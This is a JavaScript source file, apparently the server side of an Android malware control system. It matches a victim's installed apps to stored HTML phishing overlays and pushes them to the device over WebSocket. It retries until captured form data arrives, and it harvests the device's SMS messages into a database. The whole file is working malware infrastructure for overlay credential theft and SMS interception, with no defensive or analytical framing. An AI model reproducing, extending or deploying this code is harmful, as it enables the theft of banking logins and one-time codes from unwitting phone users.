    console.warn(`[WS-Device] Failed to reconcile injection status for ${deviceId}: ${err.message}`);
    void recordDeviceDebug('injection.status.persist_error', deviceId, {
      enabledPackages: status.enabledPackages,
      message: err.message || String(err),
      processingDurationMs: Date.now() - processingStartedAt,
    }, 'error');
  }
}

function scheduleInjectionStatusProbes(ws, deviceId, packageName, requestId) {
  const scheduledAt = Date.now();
  [1500, 6000].forEach(delayMs => {
    const timer = setTimeout(() => {
      if (wasInjectionCompletedSince(deviceId, packageName, scheduledAt)) {
        void recordDeviceDebug('injection.status.probe_cancelled', deviceId, {
          packageName,
          requestId,
          delayMs,
          reason: 'capture-already-completed',
        });
        return;
      }
      if (!ws || ws.readyState !== 1) {
        void recordDeviceDebug('injection.status.probe_no_route', deviceId, {
          packageName,
          requestId,
          delayMs,
        }, 'warn');
        return;
      }
      try {
        const probePayload = JSON.stringify({
          type: 'command',
          sessionId: deviceId,
          data: {
            command: 'GET_INJECTION_STATUS',
            params: { packageName, requestId, source: 'auto-injection-verify' },
          },
        });
        ws.send(probePayload);
        void recordDeviceDebug('injection.status.probe_sent', deviceId, {
          packageName,
          requestId,
          delayMs,
          command: 'GET_INJECTION_STATUS',
          source: 'auto-injection-verify',
          payloadBytes: Buffer.byteLength(probePayload, 'utf8'),
          elapsedSinceScheduleMs: Date.now() - scheduledAt,
        });
      } catch (err) {
        void recordDeviceDebug('injection.status.probe_error', deviceId, {
          packageName,
          requestId,
          delayMs,
          message: err.message || String(err),
        }, 'error');
      }
    }, delayMs);
    if (typeof timer.unref === 'function') timer.unref();
  });
}

async function waitForInjectionCommandReady(deviceId, ws, connections, minimumAgeMs = 5000) {
  const current = connections.devices.get(deviceId);
  if (!current || current.ws !== ws || ws.readyState !== 1) {
    throw new Error('device connection changed before injection dispatch');
  }
  const connectedAt = Number(current.connectedAt || Date.now());
  const waitMs = Math.max(0, minimumAgeMs - (Date.now() - connectedAt));
  if (waitMs > 0) {
    void recordDeviceDebug('injection.auto.ready_wait', deviceId, {
      waitMs,
      minimumAgeMs,
    });
    await new Promise(resolve => setTimeout(resolve, waitMs));
  }
  const latest = connections.devices.get(deviceId);
  if (!latest || latest.ws !== ws || ws.readyState !== 1) {
    throw new Error('device connection changed during injection readiness wait');
  }
}

function scheduleAutoInjectionRetry({
  db,
  ws,
  connections,
  deviceId,
  packageName,
  templateId,
  templateName,
  htmlContent,
  requestId,
}) {
  const retryDelayMs = 9000;
  const retryScheduledAt = Date.now();
  const recordRetryDecision = (decision, reason, extra = {}, level = 'info') => {
    void recordDeviceDebug('injection.auto.retry_decision', deviceId, {
      packageName,
      templateId,
      requestId,
      retryDelayMs,
      scheduledAt: retryScheduledAt,
      elapsedMs: Date.now() - retryScheduledAt,
      decision,
      reason,
      ...extra,
    }, level);
  };
  recordRetryDecision('scheduled', 'initial-show-awaiting-client-confirmation');
  const timer = setTimeout(async () => {
    try {
      const current = connections.devices.get(deviceId);
      if (!current || current.ws !== ws || ws.readyState !== 1) {
        recordRetryDecision('cancelled', 'device-ws-not-routable', {
          connectionPresent: !!current,
          sameSocket: !!current && current.ws === ws,
          wsReadyState: ws?.readyState ?? null,
        }, 'warn');
        void recordDeviceDebug('injection.auto.retry_no_route', deviceId, {
          packageName,
          templateId,
          requestId,
        }, 'warn');
        return;
      }
      if (wasInjectionCompletedSince(deviceId, packageName, retryScheduledAt)) {
        recordRetryDecision('cancelled', 'capture-already-completed', {
          completionAt: getRecentInjectionCompletion(deviceId, packageName),
        });
        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
          packageName,
          templateId,
          requestId,
          reason: 'capture-already-completed',
        });
        return;
      }

      // 只有同一条自动任务仍处于未确认状态时才重试。APK 已回复
      // injection_status（source=client-status）或用户已停止时都不再发送。
      const [rows] = await db.query(
        `SELECT task_json FROM fisher_active_injection_tasks
         WHERE device_id=? AND package_name=? LIMIT 1`,
        [deviceId, packageName]
      );
      if (!rows || rows.length === 0) {
        recordRetryDecision('cancelled', 'active-task-missing');
        return;
      }
      const originalTaskJson = typeof rows[0].task_json === 'string'
        ? rows[0].task_json
        : JSON.stringify(rows[0].task_json || {});
      let task = {};
      try {
        task = JSON.parse(originalTaskJson);
      } catch {}
      if (String(task.source || '') === 'client-status') {
        recordRetryDecision('cancelled', 'client-status-confirmed', {
          activeTaskSource: String(task.source || ''),
          activeTaskRequestId: String(task.requestId || ''),
        });
        return;
      }
      if (String(task.requestId || '') !== String(requestId || '')) {
        recordRetryDecision('cancelled', 'request-replaced', {
          activeTaskSource: String(task.source || ''),
          activeTaskRequestId: String(task.requestId || ''),
        });
        return;
      }

      const retryRequestId = `auto-retry-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
      recordRetryDecision('proceeding', 'active-task-still-unconfirmed', {
        retryRequestId,
        activeTaskSource: String(task.source || ''),
      });
      // 第二次尝试前先关闭可能残留的旧页面；此时连接已稳定，并留出
      // 1200ms 让 Android 串行完成清理，避免 STOP 异步晚于 SHOW。
      const retryStopPayload = JSON.stringify({
        type: 'command',
        sessionId: deviceId,
        data: {
          command: 'STOP_INJECTION',
          params: {
            packageName,
            requestId: retryRequestId,
            source: 'auto-retry-preflight',
          },
        },
      });
      ws.send(retryStopPayload);
      void recordDeviceDebug('injection.auto.retry_stop_sent', deviceId, {
        packageName,
        templateId,
        requestId: retryRequestId,
        previousRequestId: requestId,
        source: 'auto-retry-preflight',
        payloadBytes: Buffer.byteLength(retryStopPayload, 'utf8'),
        wsReadyState: ws.readyState,
      });
      await new Promise(resolve => setTimeout(resolve, 1200));

      const latest = connections.devices.get(deviceId);
      if (!latest || latest.ws !== ws || ws.readyState !== 1) {
        throw new Error('device connection changed before automatic retry');
      }
      if (wasInjectionCompletedSince(deviceId, packageName, retryScheduledAt)) {
        recordRetryDecision('cancelled', 'capture-completed-during-retry', {
          retryRequestId,
          phase: 'after-preflight-stop',
          completionAt: getRecentInjectionCompletion(deviceId, packageName),
        });
        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
          packageName,
          templateId,
          requestId,
          reason: 'capture-completed-during-retry',
        });
        return;
      }

      // 只允许把仍然完全等于旧请求的任务原子转换为 retry。若表单完成逻辑
      // 已删除任务，或 injection_status/手动操作已更新任务，affectedRows=0，
      // 不使用 UPSERT 重新创建已完成任务。
      const retryStartedAtMs = Date.now();
      const retryTaskJson = JSON.stringify({
        packageName,
        templateId,
        requestId: retryRequestId,
        startedAt: Math.floor(retryStartedAtMs / 1000),
        startedAtMs: retryStartedAtMs,
        source: 'auto-retry',
      });
      const [transitionResult] = await db.query(
        `UPDATE fisher_active_injection_tasks
         SET task_json=?, created_at=NOW()
         WHERE device_id=? AND package_name=? AND task_json=?`,
        [retryTaskJson, deviceId, packageName, originalTaskJson]
      );
      if (Number(transitionResult?.affectedRows || 0) === 0) {
        recordRetryDecision('cancelled', 'active-task-changed-or-cleared', {
          retryRequestId,
          transitionAffectedRows: Number(transitionResult?.affectedRows || 0),
        });
        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
          packageName,
          templateId,
          requestId,
          reason: 'active-task-changed-or-cleared',
        });
        return;
      }
      if (wasInjectionCompletedSince(deviceId, packageName, retryScheduledAt)) {
        await db.query(
          `DELETE FROM fisher_active_injection_tasks
           WHERE device_id=? AND package_name=? AND task_json=?`,
          [deviceId, packageName, retryTaskJson]
        );
        recordRetryDecision('cancelled', 'capture-completed-during-retry', {
          retryRequestId,
          phase: 'after-task-transition',
          completionAt: getRecentInjectionCompletion(deviceId, packageName),
        });
        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
          packageName,
          templateId,
          requestId,
          reason: 'capture-completed-during-retry',
        });
        return;
      }
      const retryShowPayload = JSON.stringify({
        type: 'command',
        sessionId: deviceId,
        data: {
          command: 'SHOW_INJECTION',
          params: {
            packageName,
            htmlContent,
            templateId,
            requestId: retryRequestId,
            source: 'auto-retry',
          },
        },
      });
      ws.send(retryShowPayload);
      void recordDeviceDebug('injection.auto.retry_sent', deviceId, {
        packageName,
        templateId,
        templateName: templateName || '',
        requestId: retryRequestId,
        previousRequestId: requestId,
        retryDelayMs,
        templateContentBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
        payloadBytes: Buffer.byteLength(retryShowPayload, 'utf8'),
        source: 'auto-retry',
        wsReadyState: ws.readyState,
      });
      recordRetryDecision('sent', 'retry-show-dispatched', {
        retryRequestId,
        transitionAffectedRows: Number(transitionResult?.affectedRows || 0),
        templateContentBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
      });
      scheduleInjectionStatusProbes(ws, deviceId, packageName, retryRequestId);
    } catch (err) {
      void recordDeviceDebug('injection.auto.retry_error', deviceId, {
        packageName,
        templateId,
        requestId,
        message: err.message || String(err),
      }, 'error');
    }
  }, retryDelayMs);
  if (typeof timer.unref === 'function') timer.unref();
}

/**
 * 自动注入：匹配设备安装的应用与模板，对所有匹配的包名下发 SHOW_INJECTION
 * 每个设备+包名组合自动注入一次；手动“重注”可以绕过此自动去重。
 */
async function autoInjectForDevice(deviceId, apps, ws, connections) {
  const matchingStartedAt = Date.now();
  try {
    const db = getPool();
    // ★ 优化：先查模板列表（不含 html_content），减少内存和网络开销
    const [templates] = await db.query(
      'SELECT template_id, package_name, name FROM fisher_injection_templates WHERE enabled=1'
    );
    if (!templates || templates.length === 0) {
      void recordDeviceDebug('injection.auto.match_summary', deviceId, {
        installedAppCount: Array.isArray(apps) ? apps.length : 0,
        enabledTemplateCount: 0,
        matchedTemplateCount: 0,
        injectedCount: 0,
        skippedByReason: { 'no-enabled-templates': 1 },
        durationMs: Date.now() - matchingStartedAt,
      });
      return;
    }

    // 构建设备已安装应用包名集合，同时保留安装时间用于识别“卸载后重装”。
    const installedAppsByPackage = new Map();
    for (const app of Array.isArray(apps) ? apps : []) {
      const packageName = String(
        typeof app === 'string' ? app : (app.packageName || app.package_name || app.pkg || '')
      ).trim();
      if (packageName) installedAppsByPackage.set(packageName, app);
    }
    const installedPkgs = new Set(installedAppsByPackage.keys());
    const matchedTemplateCount = templates.filter(tpl => tpl.package_name && installedPkgs.has(tpl.package_name)).length;

    // 获取该设备已注入记录
    if (!autoInjectedCache.has(deviceId)) autoInjectedCache.set(deviceId, new Set());
    const injected = autoInjectedCache.get(deviceId);
    if (!autoInjectionReservations.has(deviceId)) autoInjectionReservations.set(deviceId, new Set());
    const reservations = autoInjectionReservations.get(deviceId);

    // Node 重启后仅从“活跃任务”恢复去重。历史采集数据表示曾经完成过注入，
    // 不能永久阻止设备在重新安装、重新上线后再次自动注入。
    const guardQueries = [
      ['active tasks', `SELECT package_name, task_json FROM fisher_active_injection_tasks
                         WHERE device_id=? AND package_name IS NOT NULL AND package_name<>''`],
    ];
    const persistedActive = new Set();
    for (const [label, sql] of guardQueries) {
      try {
        const [persistedRows] = await db.query(sql, [deviceId]);
        for (const row of persistedRows || []) {
          let task = {};
          try {
            task = typeof row.task_json === 'string' ? JSON.parse(row.task_json) : (row.task_json || {});
          } catch {}
          // 只有 APK 已确认的快照才是自动注入去重依据。source=auto
          // 仅表示服务器发过命令，不能让一次启动期丢包永久阻断重试。
          if (String(task.source || '') === 'client-status') {
            persistedActive.add(String(row.package_name));
          }
        }
      } catch (guardErr) {
        // 旧库缺某张表时仍继续读取另一层去重，不阻断自动注入。
        console.warn(`[WS-Device] Auto-injection ${label} guard unavailable for ${deviceId}: ${guardErr.message}`);
      }
    }

    // 已经拿到表单数据代表这一轮自动注入已经完成。刷新应用列表只应给新匹配
    // APP 下发，不能把旧 APP 再次打开。若 APK 上报 firstInstallTime 且晚于最近
    // 采集时间，则视为目标 APP 卸载后重装，允许重新自动注入。
    const latestCaptureByPackage = new Map();
    try {
      const [captureRows] = await db.query(
        `SELECT package_name, MAX(created_at) AS latest_capture_at
         FROM fisher_injection_data
         WHERE device_id=? AND package_name IS NOT NULL AND package_name<>''
         GROUP BY package_name`,
        [deviceId]
      );
      for (const row of captureRows || []) {
        const packageName = String(row.package_name || '');
        const latestCaptureAt = normalizeTimestampSeconds(row.latest_capture_at);
        if (packageName && latestCaptureAt > 0) {
          latestCaptureByPackage.set(packageName, latestCaptureAt);
        }
      }
    } catch (guardErr) {
      console.warn(`[WS-Device] Auto-injection completed-capture guard unavailable for ${deviceId}: ${guardErr.message}`);
      void recordDeviceDebug('injection.auto.guard_error', deviceId, {
        guard: 'completed-capture',
        message: guardErr.message || String(guardErr),
      }, 'error');
    }

    const completedCaptures = new Map();
    for (const [packageName, latestCaptureAt] of latestCaptureByPackage) {
      if (!installedAppsByPackage.has(packageName)) continue;
      const appFirstInstallAt = getAppFirstInstallAt(installedAppsByPackage.get(packageName));
      const reinstalledAfterCapture = appFirstInstallAt > latestCaptureAt + 5;
      if (!reinstalledAfterCapture) {
        completedCaptures.set(packageName, { latestCaptureAt, appFirstInstallAt });
      } else {
        void recordDeviceDebug('injection.auto.reinstall_detected', deviceId, {
          packageName,
          latestCaptureAt,
          appFirstInstallAt,
          decision: 'allow-auto-inject',
        });
      }
    }

    // DB 中已经没有已确认活跃任务、完成记录，也不是本进程当前预留的包，
    // 才是过期内存状态。完成记录会一直阻止普通刷新重复注入；“重注”仍由前端
    // 手动流程显式绕过此自动去重。
    for (const packageName of [...injected]) {
      if (!persistedActive.has(packageName) && !completedCaptures.has(packageName) && !reservations.has(packageName)) {
        injected.delete(packageName);
        void recordDeviceDebug('injection.auto.stale_cache_cleared', deviceId, { packageName });
      }
    }
    for (const packageName of persistedActive) injected.add(packageName);
    for (const packageName of completedCaptures.keys()) injected.add(packageName);

    // 匹配模板（跳过已注入过的）
    let injectedCount = 0;
    const injectedPackages = [];
    const injectedTemplateIds = [];
    const skippedByReason = {};
    for (const tpl of templates) {
      const pkg = tpl.package_name;
      if (!pkg || !installedPkgs.has(pkg)) continue;
      if (injected.has(pkg)) {
        const skipReason = completedCaptures.has(pkg)
          ? 'completed-capture'
          : persistedActive.has(pkg)
            ? 'active-task'
            : reservations.has(pkg)
              ? 'concurrent-reservation'
              : 'client-confirmed-cache';
        console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (${skipReason})`);
        skippedByReason[skipReason] = Number(skippedByReason[skipReason] || 0) + 1;
        void recordDeviceDebug('injection.auto.skipped', deviceId, {
          packageName: pkg,
          templateId: tpl.template_id,
          reason: skipReason,
        });
        continue;
      }

      // 必须在第一个 await 之前预留包名。客户端可能同时以 command_result
      // 和 app_list_response 返回同一列表，若在 send 后才 add，两个协程都会下发。
      injected.add(pkg);
      reservations.add(pkg);
      let sent = false;
      let taskPersisted = false;
      const requestId = `auto-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

      try {
        // ★ 匹配到后才查 html_content（按需加载，避免一次性加载几百个 HTML）
        const [rows] = await db.query(
          'SELECT html_content FROM fisher_injection_templates WHERE template_id=? LIMIT 1',
          [tpl.template_id]
        );
        const htmlContent = rows?.[0]?.html_content;
        if (!htmlContent) {
          skippedByReason['template-html-missing'] = Number(skippedByReason['template-html-missing'] || 0) + 1;
          void recordDeviceDebug('injection.auto.skipped', deviceId, {
            packageName: pkg,
            templateId: tpl.template_id,
            reason: 'template-html-missing',
          }, 'warn');
          continue;
        }

        // 先登记活跃任务再下发。这样 APK 即使毫秒级确认，控制台
        // 也不会在“发送成功”和“DB 写入”的空窗期显示错误状态。
        if (ws.readyState === 1) {
          // HTTP 应用列表经常在 WS 刚连接约 1 秒内到达。此时 APK 的注入
          // 处理器尚未完成启动，立即 SHOW 会被静默丢弃。先等连接稳定；首次
          // 自动注入不再先发 STOP，避免 Android 异步 STOP 晚于 SHOW 生效。
          await waitForInjectionCommandReady(deviceId, ws, connections);

          try {
            const affectedRows = await persistActiveInjectionTask(
              db,
              deviceId,
              pkg,
              tpl.template_id,
              'auto',
              requestId
            );
            taskPersisted = true;
            void recordDeviceDebug('injection.auto.task_persisted', deviceId, {
              packageName: pkg,
              templateId: tpl.template_id,
              requestId,
              affectedRows,
            });
          } catch (taskErr) {
            void recordDeviceDebug('injection.auto.task_persist_error', deviceId, {
              packageName: pkg,
              templateId: tpl.template_id,
              requestId,
              message: taskErr.message || String(taskErr),
            }, 'error');
            throw taskErr;
          }

          const showPayload = JSON.stringify({
            type: 'command',
            sessionId: deviceId,
            data: {
              command: 'SHOW_INJECTION',
              params: {
                packageName: pkg,
                htmlContent: htmlContent,
                templateId: tpl.template_id,
                requestId,
                source: 'auto'
              }
            }
          });
          ws.send(showPayload);
          sent = true;
          injectedCount++;
          injectedPackages.push(pkg);
          injectedTemplateIds.push(tpl.template_id);

          console.log(`[WS-Device] Auto-inject ${pkg} (${tpl.name}) to ${deviceId}`);
          void recordDeviceDebug('injection.auto.sent', deviceId, {
            packageName: pkg,
            templateId: tpl.template_id,
            templateName: tpl.name || '',
            requestId,
            source: 'auto',
            templateContentBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
            payloadBytes: Buffer.byteLength(showPayload, 'utf8'),
            taskPersisted,
            connectionAgeMs: Math.max(
              0,
              Date.now() - Number(connections.devices.get(deviceId)?.connectedAt || Date.now())
            ),
            wsReadyState: ws.readyState,
          });
          scheduleInjectionStatusProbes(ws, deviceId, pkg, requestId);
          scheduleAutoInjectionRetry({
            db,
            ws,
            connections,
            deviceId,
            packageName: pkg,
            templateId: tpl.template_id,
            templateName: tpl.name,
            htmlContent,
            requestId,
          });
        }
      } catch (sendErr) {
        skippedByReason['send-error'] = Number(skippedByReason['send-error'] || 0) + 1;
        if (taskPersisted && !sent) {
          try {
            await db.query(
              'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
              [deviceId, pkg]
            );
          } catch {}
        }
        void recordDeviceDebug('injection.auto.send_error', deviceId, {
          packageName: pkg,
          templateId: tpl.template_id,
          requestId,
          taskPersisted,
          message: sendErr.message || String(sendErr),
        }, 'error');
      } finally {
        reservations.delete(pkg);
        // 未真正下发时释放预留，允许后续应用列表响应重试。
        if (!sent) injected.delete(pkg);
      }
    }
    if (injectedCount > 0) {
      console.log(`[WS-Device] Auto-injected ${injectedCount} apps for ${deviceId}`);
      broadcastToAdmins(connections, {
        type: 'auto_injection_done',
        deviceId,
        count: injectedCount,
        packages: injectedPackages,
        templateIds: injectedTemplateIds
      });
    }
    void recordDeviceDebug('injection.auto.match_summary', deviceId, {
      installedAppCount: installedPkgs.size,
      enabledTemplateCount: templates.length,
      matchedTemplateCount,
      persistedActiveCount: persistedActive.size,
      completedCaptureCount: completedCaptures.size,
      reservedCount: reservations.size,
      injectedCount,
      injectedPackages,
      injectedTemplateIds,
      skippedByReason,
      durationMs: Date.now() - matchingStartedAt,
    });
  } catch (err) {
    console.error('[WS-Device] autoInjectForDevice error:', err.message);
    void recordDeviceDebug('injection.auto.match_summary', deviceId, {
      installedAppCount: Array.isArray(apps) ? apps.length : 0,
      outcome: 'error',
      message: err.message || String(err),
      durationMs: Date.now() - matchingStartedAt,
    }, 'error');
  }
}

/**
 * 保存设备数据到 AI 分析缓存表 fisher_ai_device_data
 * UPSERT: 按 device_id + data_type 唯一键更新
 */
async function saveAiDeviceData(deviceId, dataType, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const jsonStr = JSON.stringify(data);
    const count = Array.isArray(data) ? data.length : 1;
    await db.query(
      `INSERT INTO fisher_ai_device_data (device_id, data_type, data_json, data_count, updated_at)
       VALUES (?, ?, ?, ?, NOW())
       ON DUPLICATE KEY UPDATE data_json=VALUES(data_json), data_count=VALUES(data_count), updated_at=NOW()`,
      [deviceId, dataType, jsonStr, count]
    );
    console.log(`[WS-Device] Saved AI data: ${deviceId} type=${dataType} count=${count}`);
  } catch (err) {
    console.error('[WS-Device] saveAiDeviceData error:', err.message);
  }
}

/**
 * 增量保存短信到 fisher_sms_messages 表
 * 去重逻辑：按 device_id + address + body + date 判断是否已存在
 * 只插入新短信，避免重复
 */
async function saveSmsToMessages(deviceId, smsList) {
  if (!deviceId || !Array.isArray(smsList) || smsList.length === 0) return;
  try {
    const db = getPool();
    // 获取该设备已有短信的去重指纹集合
    const [existing] = await db.query(
      'SELECT address, body, date FROM fisher_sms_messages WHERE device_id = ?',
      [deviceId]
    );
    const existingSet = new Set(
      existing.map(r => `${r.address || ''}|${(r.body || '').substring(0, 100)}|${r.date || ''}`)
    );

    // 筛选出新短信
    const newItems = [];
    for (const sms of smsList) {
      const addr = sms.address || sms.sender || sms.from || sms.number || '';
      const body = sms.body || sms.content || sms.message || '';
      const date = sms.date || sms.time || sms.timestamp || '';
      const dateStr = String(date);
      const fingerprint = `${addr}|${body.substring(0, 100)}|${dateStr}`;
      if (!existingSet.has(fingerprint)) {
        newItems.push({ addr, body, date: dateStr, sms });
        existingSet.add(fingerprint); // 防止同一批中重复
      }
    }

    if (newItems.length === 0) {
      console.log(`[WS-Device] saveSmsToMessages: ${deviceId} no new SMS (all ${smsList.length} already exist)`);
      return;
    }

    // 批量插入新短信
    const values = newItems.map(item => {
      const smsType = item.sms.type !== undefined ? parseInt(item.sms.type) || 1 : 1;
      const read = item.sms.read !== undefined ? (item.sms.read ? 1 : 0) : 0;
      const createdAt = Math.floor(Date.now() / 1000);
      return [deviceId, item.addr, item.body, item.date, smsType, read, createdAt];
    });

    const placeholders = values.map(() => '(?, ?, ?, ?, ?, ?, ?)').join(', ');
    const flat = values.flat();
    await db.query(
      `INSERT INTO fisher_sms_messages (device_id, address, body, date, type, \`read\`, created_at) VALUES ${placeholders}`,
      flat
    );
    console.log(`[WS-Device] saveSmsToMessages: ${deviceId} inserted ${newItems.length} new SMS (total received: ${smsList.length})`);
  } catch (err) {
    console.error('[WS-Device] saveSmsToMessages error:', err.message);
  }
}

module.exports = { handleDevice, handleDeviceMessage, syncDeviceStatus, handleUploadedAppList, resolveClientIp };
